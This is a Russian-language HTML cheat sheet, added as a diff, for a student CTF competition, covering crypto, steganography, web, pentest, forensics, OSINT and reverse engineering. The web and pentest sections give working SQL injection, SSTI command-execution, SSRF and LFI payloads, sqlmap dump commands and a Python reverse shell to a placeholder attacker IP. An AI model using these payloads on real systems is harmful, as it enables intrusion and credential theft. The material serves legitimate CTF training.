@@ -1,0 +1,289 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>CTF Шпаргалка · Кибербитва</title>
+<style>
+  :root{
+    color-scheme: dark;
+    --bg:#0d1117; --panel:#161b22; --panel2:#1c2330;
+    --border:#2a3444; --text:#e6edf3; --muted:#9aa7b4;
+    --accent:#3fb950; --accent2:#58a6ff; --warn:#e3b341;
+    --code-bg:#0a0e14; --code-text:#c9d6e3;
+    --mono: ui-monospace, "SF Mono", "Cascadia Code", "JetBrains Mono", Consolas, monospace;
+    --sans: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0}
+  body{
+    background:var(--bg); color:var(--text); font-family:var(--sans);
+    font-size:15px; line-height:1.6;
+    padding: env(safe-area-inset-top,0px) 0 env(safe-area-inset-bottom,0px);
+  }
+  .wrap{max-width:820px; margin:0 auto; padding:24px 16px 64px;}
+  header{border-bottom:1px solid var(--border); padding-bottom:16px; margin-bottom:8px;}
+  h1{font-size:26px; margin:0 0 4px; text-wrap:balance;}
+  h1 .accent{color:var(--accent);}
+  .sub{color:var(--muted); font-size:14px; margin:0;}
+  .tip{background:var(--panel2); border:1px solid var(--border); border-radius:8px;
+       padding:12px 14px; font-size:13.5px; color:var(--muted); margin:16px 0;}
+  .tip b{color:var(--text);}
+  .tip code{color:var(--accent);}
+  section{background:var(--panel); border:1px solid var(--border); border-radius:10px;
+          padding:18px 18px 8px; margin:16px 0;}
+  h2{font-size:19px; margin:0 0 2px; color:var(--accent2); display:flex; align-items:baseline; gap:10px;}
+  h2 .track{font-size:11px; font-weight:600; letter-spacing:.08em; text-transform:uppercase;
+            color:var(--bg); background:var(--accent); border-radius:4px; padding:2px 7px;}
+  h2 .track.red{background:#f85149;} h2 .track.blue{background:var(--accent2);}
+  .lead{color:var(--muted); font-size:14px; margin:6px 0 12px;}
+  h3{font-size:14px; margin:16px 0 6px; color:var(--text); letter-spacing:.02em;}
+  p{margin:8px 0;}
+  p code, li code{background:var(--code-bg); color:var(--accent); padding:1px 5px;
+                  border-radius:4px; font-family:var(--mono); font-size:13px;}
+  pre{background:var(--code-bg); border:1px solid var(--border); border-radius:8px;
+      padding:12px 14px; overflow-x:auto; margin:8px 0;}
+  pre code{font-family:var(--mono); font-size:13px; color:var(--code-text); line-height:1.7; white-space:pre;}
+  .cmt{color:#6e7d8c;}
+  ul{margin:8px 0; padding-left:20px;} li{margin:4px 0;}
+  a{color:var(--accent2);}
+  footer{color:var(--muted); font-size:13px; margin-top:24px; text-align:center;}
+  strong{color:var(--text);}
+</style>
+</head>
+<body>
+<div class="wrap">
+<header>
+  <h1><span class="accent">CTF</span> Шпаргалка · Кибербитва</h1>
+  <p class="sub">Собрано по категориям заданий ПРО Кибербез Уфа. Ищи по Ctrl+F.</p>
+</header>
+
+<div class="tip">
+  <b>Как работать:</b> распознать класс задачи → взять готовый приём отсюда → применить. Payload'ы не зубрят, их подсматривают.<br>
+  <b>Формат флага:</b> <code>flag{...}</code> или <code>kiberbitva{...}</code> — уточни у организаторов на старте.<br>
+  <b>Открой в закладках:</b> HackTricks (book.hacktricks.xyz), PayloadsAllTheThings (github.com/swisskyrepo/PayloadsAllTheThings), CyberChef (gchq.github.io/CyberChef).<br>
+  <b>Тактика:</b> бери задачи от дешёвых к дорогим, не залипай на одной больше 30–40 минут. Команда до 3 человек — раздели: web+crypto / forensics+SIEM / пентест.
+</div>
+
+<div class="tip">
+  <b>Внимание, система:</b> команды ниже (<code>file</code>, <code>strings</code>, <code>binwalk</code>, <code>steghide</code>, <code>grep</code>) — это <b>Linux</b>. На чистой Windows их нет. Решение — поставить Linux внутрь Windows (WSL):<br>
+  1. PowerShell <b>от администратора</b>: <code>wsl --install</code> → перезагрузка → задать логин/пароль.<br>
+  2. Установить инструменты: <code>sudo apt update &amp;&amp; sudo apt install file binwalk steghide exiftool john -y</code><br>
+  3. Свои файлы с диска D видно по пути <code>/mnt/d/...</code><br>
+  После этого все команды из шпаргалки работают как написано. Что не требует Linux: <b>CyberChef</b> (в браузере), <b>pylingual.io</b>, Python-скрипты (Python есть и на Windows).
+</div>
+
+<section>
+  <h2>Крипто <span class="track">CTF</span></h2>
+  <p class="lead">Простые задачи, быстрые очки. Бери первыми.</p>
+  <p>Любую непонятную строку сначала в <strong>CyberChef → кнопка «Magic»</strong> — он сам определит кодировку. Не помогло — вручную:</p>
+  <pre><code>echo 'строка' | base64 -d          <span class="cmt"># base64: буквы+цифры+/, часто '=' в конце</span>
+echo '48656c6c6f' | xxd -r -p      <span class="cmt"># hex: только 0-9 a-f</span></code></pre>
+  <ul>
+    <li><strong>Цезарь / ROT</strong> — перебор 25 сдвигов, в CyberChef «ROT13 Brute Force».</li>
+    <li><strong>Морзе</strong> (<code>.- -...</code>) — CyberChef «From Morse Code».</li>
+    <li><strong>Бинарная морзе</strong> (нолики-единички) — сначала биты → точки/тире, потом → текст.</li>
+    <li><strong>Yoptascript / JSFuck</strong> (код из <code>[]()!+</code>) — вставь в консоль браузера (F12), выполнится сам.</li>
+    <li><strong>Хэши файлов</strong> — тип по длине (32=MD5, 40=SHA1), пробей на crackstation.net или <code>john</code>.</li>
+  </ul>
+  <h3>Неизвестная кодировка (кракозябры типа <code>ÃãÆÀÉ£¢</code>)</h3>
+  <p>Признак: длина «мусора» = длине ожидаемого текста → это не тот charset, а не шифр. Символы вроде <code>Ã Æ ¢</code> = текст сохранён в UTF-8, прочитан иначе. Не гадай кодировку — перебери все скриптом:</p>
+  <pre><code>data = open("файл.txt","rb").read().rstrip()
+inner = data.decode("utf-8").encode("latin1")   <span class="cmt"># снять внешний UTF-8-слой</span>
+import encodings, pkgutil
+for name in set(m.name for m in pkgutil.iter_modules(encodings.__path__)):
+    try:
+        t = inner.decode(name)
+        if "CTF" in t or "flag" in t.lower() or "{" in t:
+            print(name, "->", t)
+    except: pass</code></pre>
+  <p>Выведет читаемое, напр. <code>cp037 -> CTF{...}</code> (cp037 = EBCDIC). В CyberChef то же: Magic, либо вручную «Encode text → ISO-8859-1», затем «Decode text → IBM EBCDIC (500)».</p>
+</section>
+
+<section>
+  <h2>Стего <span class="track">CTF</span></h2>
+  <p class="lead">С ЛЮБОГО файла начинай с базовой проверки — часто этого хватает:</p>
+  <pre><code>file имя                    <span class="cmt"># что это на самом деле (тип)</span>
+strings имя | grep -i flag  <span class="cmt"># текст/флаг прямо внутри</span>
+binwalk -e имя              <span class="cmt"># вытащить вложенные файлы</span>
+exiftool имя                <span class="cmt"># метаданные (для фото/видео) — иногда флаг или GPS</span></code></pre>
+  <h3>Фото / картинки (.png .jpg)</h3>
+  <ul>
+    <li><code>steghide extract -sf имя.jpg</code> — достать данные из jpg (пароль часто пустой). Пароль неизвестен → <code>stegseek имя.jpg rockyou.txt</code>.</li>
+    <li><code>zsteg имя.png</code> — младшие биты (LSB) в PNG.</li>
+    <li>Цветовые слои и биты — <strong>StegOnline</strong> (georgeom.net/StegOnline) или CyberChef. Флаг часто виден, если «покрутить» каналы/яркость.</li>
+    <li>Текст мог быть подрисован — просто открой и разгляди на разном зуме/контрасте.</li>
+  </ul>
+  <h3>Аудио (.wav .mp3)</h3>
+  <ul>
+    <li><strong>Спектрограмма — приём №1.</strong> Флаг часто «нарисован» в частотах внизу. Три способа: <strong>Audacity</strong> (клик по названию дорожки → «Спектрограмма»), онлайн (academo.org/demos/spectrum-analyzer), или Python-скриптом без установки редактора (нужны <code>python3-numpy python3-scipy python3-matplotlib</code>):</li>
+  </ul>
+  <pre><code>python3 -c "import matplotlib;matplotlib.use('Agg');import matplotlib.pyplot as plt;from scipy.io import wavfile;sr,d=wavfile.read('имя.wav');d=d[:,0] if d.ndim>1 else d;plt.specgram(d,Fs=sr,NFFT=1024,noverlap=768,cmap='inferno');plt.tight_layout();plt.savefig('spec.png',dpi=120)"
+explorer.exe spec.png   <span class="cmt"># открыть картинку из WSL в Windows</span></code></pre>
+  <ul>
+    <li>Послушать: голос диктует флаг, или <strong>Морзе</strong> (писки — раскодируй по длине), или <strong>DTMF</strong> (тоны кнопок телефона — онлайн-декодер DTMF).</li>
+    <li>Покрутить звук в Audacity: реверс (задом наперёд), замедление — скрытое иногда слышно/видно только так.</li>
+    <li>LSB в отсчётах: <code>pip install stego-lsb</code> → <code>stegolsb wavsteg -r -i имя.wav -o out.txt -n 1</code>.</li>
+  </ul>
+  <h3>Видео (.mp4 .avi)</h3>
+  <ul>
+    <li>Флаг в кадре — разложи на кадры: <code>ffmpeg -i имя.mp4 frames/%04d.png</code>, пролистай (иногда флаг мелькает 1 кадр).</li>
+    <li>Флаг в звуке — вытащи аудио и смотри спектрограмму: <code>ffmpeg -i имя.mp4 -vn audio.wav</code>, дальше как «Аудио» выше.</li>
+    <li>Вложенное/дописанное — <code>binwalk -e имя.mp4</code>, <code>strings</code>; метаданные — <code>exiftool</code>.</li>
+  </ul>
+  <h3>Текстовое стего (.txt, обычный текст)</h3>
+  <p>Проверяй по порядку: (1) невидимые символы нулевой ширины — 330k.github.io/steganography; (2) кодирование в пробелах/табах в конце строк — <code>cat -A файл</code> (таб = <code>^I</code>, конец строки = <code>$</code>); (3) чужие символы среди кириллицы — латинские буквы-двойники. Вытащить их скриптом:</p>
+  <pre><code>python3 -c "print(''.join(c for c in open('файл.txt',encoding='utf-8').read() if c.isascii() and c.isalnum()))"</code></pre>
+  <p>Оставит только не-кириллические буквы/цифры по порядку — они складываются в сообщение или флаг. Намёк: цифра или латинская буква вместо русской (напр. «Войн4»).</p>
+  <h3>Пробелы/табы = бинарный код (часто в .docx)</h3>
+  <p>Если под текстом строка из пробелов и табуляций — это двоичный код: <strong>пробел = 0, таб = 1</strong>. Бьёшь по 8 бит → ASCII. Для .docx сначала ставишь <code>python3-docx</code> (или <code>pip install python-docx --break-system-packages</code>), потом:</p>
+  <pre><code>python3 -c "
+from docx import Document
+d=Document('файл.docx')
+ws=''.join(p.text for p in d.paragraphs if p.text and all(c in ' \t' for c in p.text))
+bits=''.join('1' if c=='\t' else '0' for c in ws)
+print(''.join(chr(int(bits[i:i+8],2)) for i in range(0,len(bits)-7,8)))
+"</code></pre>
+  <p>Важно: берёшь только строку ЦЕЛИКОМ из пробелов/табов (условие <code>all(...)</code>), иначе пробелы между словами всё испортят. Намёк в условии обычно «смотри не на текст, а вокруг».</p>
+</section>
+
+<section>
+  <h2>Веб <span class="track">CTF</span></h2>
+  <p class="lead">Сначала всегда: исходник (Ctrl+U), куки (F12 → Application), <code>/robots.txt</code>, комментарии в коде, скрытые эндпоинты.</p>
+  <pre><code>SSTI (ввод в шаблон):  {{7*7}}   <span class="cmt"># вернёт 49 → уязвимо, дальше payload под движок</span>
+LFI (?file=, ?page=):  ../../../../etc/passwd</code></pre>
+  <h3>SQL-инъекция (полностью)</h3>
+  <p><strong>А. Обойти форму входа.</strong> В поле «логин» вводишь <code>' OR '1'='1'-- -</code>, пароль любой. Запрос превращается в «…WHERE login='' OR '1'='1' -- …»: условие всегда истинно, а <code>-- </code> отрезает проверку пароля → входишь первым пользователем.</p>
+  <p><strong>Б. Вытащить данные через параметр в ссылке</strong> (напр. <code>?id=1</code>):</p>
+  <pre><code>?id=1'                       <span class="cmt"># 1) ошибка базы → инъекция есть</span>
+?id=1 ORDER BY 1-- -         <span class="cmt"># 2) увеличивай число до ошибки = число столбцов</span>
+?id=-1 UNION SELECT 1,2,3-- -    <span class="cmt"># 3) на странице проступит № видимого столбца</span>
+?id=-1 UNION SELECT 1,database(),3-- -                <span class="cmt"># 4) имя базы</span>
+?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -   <span class="cmt"># таблицы</span>
+?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -   <span class="cmt"># логины:пароли</span></code></pre>
+  <p><strong>В. Автоматом (sqlmap)</strong> — когда инъекция подтвердилась:</p>
+  <pre><code>sqlmap -u "http://site/p.php?id=1" --batch --dbs            <span class="cmt"># базы</span>
+sqlmap -u "http://site/p.php?id=1" --batch -D база --tables  <span class="cmt"># таблицы</span>
+sqlmap -u "http://site/p.php?id=1" --batch -D база -T users --dump  <span class="cmt"># выгрузить</span></code></pre>
+  <h3>SSTI — эксплуатация (Jinja2 / Flask)</h3>
+  <p>После подтверждения <code>{{7*7}}=49</code> — чтение файла через цепочку до <code>os</code> (копируется из HackTricks «SSTI»):</p>
+  <pre><code>{{ cycler.__init__.__globals__.os.popen('find / -name "flag*" 2>/dev/null').read() }}
+{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}</code></pre>
+  <h3>SSRF (<code>?url=</code>, сервер сам ходит по ссылке)</h3>
+  <p>Флаг за фильтром «только localhost» — обход альтернативной записью <code>127.0.0.1</code>:</p>
+  <pre><code>http://127.1/flag          http://2130706433/flag
+http://0x7f000001/flag     http://[::ffff:127.0.0.1]/flag</code></pre>
+  <h3>Прочее</h3>
+  <ul>
+    <li><strong>Обход авторизации</strong> — дефолты admin/admin, кука <code>role=user→admin</code>, JWT с <code>alg:none</code>.</li>
+    <li><strong>Скрытые страницы/файлы</strong> — <code>gobuster dir -u http://цель -w common.txt</code>.</li>
+    <li><strong>Готовая CVE</strong> (openfire, версия в заголовках) — гуглишь «продукт версия exploit».</li>
+  </ul>
+</section>
+
+<section>
+  <h2>Пентест <span class="track red">RED</span></h2>
+  <p class="lead">Ты взломщик. Цель: пробраться в чужой комп и забрать флаг. Суть: какие двери открыты → где дыра → получить командную строку (шелл) → дорасти до root → прочитать флаг.</p>
+  <h3>1. Разведка портов</h3>
+  <pre><code>nmap -sC -sV -p- &lt;ip&gt;   <span class="cmt"># все открытые порты и что за ними за программы</span></code></pre>
+  <h3>2. По каждому открытому порту — что пробовать</h3>
+  <ul>
+    <li><strong>21 FTP</strong> — анонимный вход: <code>ftp &lt;ip&gt;</code>, логин <code>anonymous</code>, пароль любой → <code>ls</code>, <code>get файл</code>.</li>
+    <li><strong>22 SSH</strong> — нужны креды: <code>ssh user@&lt;ip&gt;</code>. Ломается только найденными паролями.</li>
+    <li><strong>80/443/8080 веб</strong> — главный вход. Браузер + <code>gobuster dir -u http://&lt;ip&gt; -w /usr/share/wordlists/dirb/common.txt</code>. Ищи SQLi, загрузку файлов, LFI, дефолт admin/admin (см. раздел Веб и SQL ниже).</li>
+    <li><strong>139/445 SMB</strong> — <code>smbclient -L //&lt;ip&gt;/</code> и <code>enum4linux -a &lt;ip&gt;</code> (папки и юзеры, часто без пароля).</li>
+    <li><strong>3306/5432/1433 БД</strong> — вход дефолт/найденными кредами: <code>mysql -h &lt;ip&gt; -u root -p</code>.</li>
+    <li><strong>3389 RDP</strong> — <code>xfreerdp /u:юзер /p:пароль /v:&lt;ip&gt;</code>.</li>
+    <li><strong>6379 Redis</strong> — часто без пароля: <code>redis-cli -h &lt;ip&gt;</code> → <code>keys *</code>.</li>
+    <li><strong>111/2049 NFS</strong> — <code>showmount -e &lt;ip&gt;</code> (что примонтировать).</li>
+    <li>Незнакомый порт → гугли «&lt;номер&gt; enumeration hacktricks», там точные шаги. Версию из nmap → <code>searchsploit &lt;продукт версия&gt;</code>.</li>
+  </ul>
+  <h3>3. Получить шелл (командную строку на их машине)</h3>
+  <p>Reverse-shell: у себя запускаешь приёмник <code>nc -lvnp 4444</code>, на жертве выполняешь строку — она подключается обратно к тебе:</p>
+  <pre><code>python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ТВОЙ_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'</code></pre>
+  <p>Стабилизировать шелл: <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></p>
+  <h3>4. Повышение прав до root (privesc)</h3>
+  <pre><code>whoami; id                       <span class="cmt"># кто я сейчас</span>
+sudo -l                          <span class="cmt"># что разрешено запускать от root</span>
+find / -perm -4000 2>/dev/null   <span class="cmt"># SUID-программы → путь к root</span>
+getcap -r / 2>/dev/null          <span class="cmt"># спец-привилегии</span></code></pre>
+  <p>Проще всего — залить и запустить <strong>linpeas.sh</strong>, он сам подсветит вектор. Способ подъёма смотри на <strong>gtfobins.github.io</strong>. Побег из docker — ищи <code>.dockerenv</code>, примонтированный docker-сокет.</p>
+  <h3>5. Забрать флаг</h3>
+  <pre><code>find / -name "*flag*" 2>/dev/null
+cat /root/flag.txt   <span class="cmt"># типичные места: /root/flag.txt, /home/*/user.txt</span></code></pre>
+</section>
+
+<section>
+  <h2>Форензика и логи <span class="track blue">BLUE</span></h2>
+  <p class="lead">Ты следователь. Атака уже произошла — тебе дали логи/трафик, найди следы и ответь на вопрос (IP атакующего, имя вируса, адрес C2). Суть: что дали → что спрашивают → grep по логам или Follow Stream в трафике → аномалия = ответ.</p>
+  <h3>Логи входов Linux (/var/log/auth.log)</h3>
+  <pre><code>grep -iE "Failed|Accepted" auth.log  <span class="cmt"># вал Failed с одного IP → потом Accepted = подобрали пароль, это и есть атакующий</span>
+grep -i sudo auth.log                <span class="cmt"># попытки повышения прав</span></code></pre>
+  <h3>Логи веб-сервера (access.log)</h3>
+  <pre><code>grep -iE "union|select|\.\./|cmd=|&lt;script" access.log  <span class="cmt"># следы SQLi, LFI, RCE, XSS</span></code></pre>
+  <p>Странный User-Agent (<code>sqlmap</code>, <code>nikto</code>, <code>gobuster</code>) = автоматический инструмент атакующего. Код 200 на <code>/admin</code> = получил доступ.</p>
+  <h3>Трафик (.pcap) — Wireshark</h3>
+  <p>В строке фильтра сверху вводишь и жмёшь Enter:</p>
+  <ul>
+    <li><code>http.request</code> — все запросы к сайтам. Правый клик на строке → <strong>Follow → HTTP Stream</strong> — вся переписка целиком.</li>
+    <li>Меню <strong>File → Export Objects → HTTP</strong> — вытащит скачанные по сети файлы (так находишь вирус).</li>
+    <li><code>dns</code> — к каким доменам обращались. <strong>C2</strong> (сервер управления вирусом) виден как повторные запросы к одному адресу через равные промежутки («маячок», beaconing).</li>
+    <li><code>ip.addr==&lt;адрес&gt;</code> — отфильтровать по конкретному узлу; <code>ftp</code>, <code>telnet</code> — часто пароли открытым текстом.</li>
+  </ul>
+  <h3>Windows-события (.evtx)</h3>
+  <p>Открой в Event Viewer или прогони через <strong>Chainsaw</strong>. Ключевые Event ID: <strong>4625</strong> неудачный вход (много = брутфорс), <strong>4624</strong> успешный вход, <strong>4688</strong> запуск процесса, <strong>4720</strong> создан пользователь.</p>
+  <h3>Вредоносный код</h3>
+  <ul>
+    <li><strong>PowerShell</strong> (длинная строка после <code>-enc</code>) — в CyberChef рецепт «From Base64 → Gunzip» покажет настоящую команду.</li>
+    <li><strong>Макрос в Office</strong> — <code>olevba файл.docm</code>.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>OSINT <span class="track">CTF</span></h2>
+  <p class="lead">Лёгкие, но времязатратные. Часто — геолокация по фото.</p>
+  <ul>
+    <li><strong>Фото</strong> — сначала <code>exiftool фото.jpg</code> (GPS бывает прямо в метаданных).</li>
+    <li><strong>Место по картинке</strong> — обратный поиск в <strong>Яндексе</strong> (для РФ сильнее Google), сопоставление зданий через Яндекс.Карты и панорамы.</li>
+    <li><strong>Ник</strong> — sherlock (github.com/sherlock-project) или whatsmyname.app.</li>
+    <li><strong>Человек</strong> — соцсети, кэш поисковиков.</li>
+    <li><strong>Символы <code>///</code></strong> — это <strong>what3words.com</strong> (каждый квадрат 3×3 м = 3 слова). Три слова → сайт → координаты → на карту (Google Earth / Яндекс.Карты).</li>
+    <li><strong>OSINT — это цепочка.</strong> Один ответ ведёт к следующему: координаты → подпись на карте → Telegram-канал → ссылка на Яндекс.Диск → флаг. Иди по звеньям, не бросай на середине.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>Misc / головоломки <span class="track">CTF</span></h2>
+  <ul>
+    <li><strong>Ответ часто в самом условии и названии.</strong> В misc-задачах текст и заголовок — это подсказки, а не «вода». Каждую деталь истории воспринимай как ключ (пример с отбора: «не выключай» = reset, «бубнил в джойстик» = микрофон контроллера).</li>
+    <li><strong>Книжный шифр.</strong> Если дан текст и набор чисел — числа это позиции: строка→абзац/предложение, число→номер слова или буквы. Собираешь по индексам → получается сообщение.</li>
+    <li><strong>Игровой файл</strong> (.nes, .gb, ром) — открывай в эмуляторе (Mesen для NES), решение бывает внутри самой игры/механики.</li>
+    <li><strong>Не спеши реверсить/спрашивать ИИ</strong> — авторы прячут фальшивые флаги для тех, кто лезет напролом. Сначала подумай над условием.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>Реверс <span class="track">CTF</span></h2>
+  <p class="lead">Первым делом всегда: <code>file имя</code> (что это) и <code>strings имя | grep -i flag</code> (флаг часто лежит строкой).</p>
+  <h3>Python .exe (PyInstaller) — самый частый случай</h3>
+  <p>Признак: .exe на 10–80 МБ; внутри <code>strings</code> видно <code>PYZ</code>, <code>pythonXXX.dll</code>. Разбор:</p>
+  <pre><code>pip install pyinstxtractor-ng
+pyinstxtractor-ng program.exe      <span class="cmt"># → папка program.exe_extracted</span></code></pre>
+  <p>В папке найди <strong>main.pyc</strong> (в выводе он помечен «Possible entry point»). Дальше декомпилируй его в читаемый Python:</p>
+  <ul>
+    <li>Свежий Python (3.11–3.13) — онлайн <strong>pylingual.io</strong> (загрузи main.pyc).</li>
+    <li>Старый Python (≤3.9) — <code>uncompyle6 main.pyc</code> или <code>decompyle3</code>.</li>
+  </ul>
+  <p>В коде ищи <code>flag</code>. Если флага в коде нет (бывает троллинг «флаг не здесь») — смотри, что программа делает: раскодируй вшитые base64-данные, проверь картинки/видео/звук, которые она использует.</p>
+  <h3>Прочие бинарники</h3>
+  <ul>
+    <li><strong>.pyc отдельным файлом</strong> — сразу на pylingual.io (или uncompyle6 для старых версий).</li>
+    <li><strong>Нативный .exe/.elf</strong> — <strong>Ghidra</strong> (декомпиляция в псевдо-C), ищешь функцию проверки флага; для запуска и просмотра — отладчик gdb+pwndbg.</li>
+    <li><strong>JS/Python-скрипт</strong> — читай логику проверки и восстанавливай нужный ввод.</li>
+  </ul>
+</section>
+
+<footer>Шпаргалка под задачи Кибербитвы · открывается offline · удачи завтра</footer>
+</div>
+</body>
+</html>
